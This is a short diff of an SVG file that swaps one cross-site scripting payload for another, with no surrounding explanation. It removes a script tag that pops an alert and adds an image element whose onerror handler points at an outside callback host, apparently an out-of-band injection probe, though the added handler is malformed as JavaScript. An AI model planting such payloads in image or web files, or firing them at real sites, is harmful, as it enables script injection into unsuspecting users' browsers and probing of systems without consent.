@@ -1,4 +1,4 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert('XSS');</script>
+  <IMG SRC=# onerror=http://qpeegim4.eyes.sh/abc>
 </svg>
 
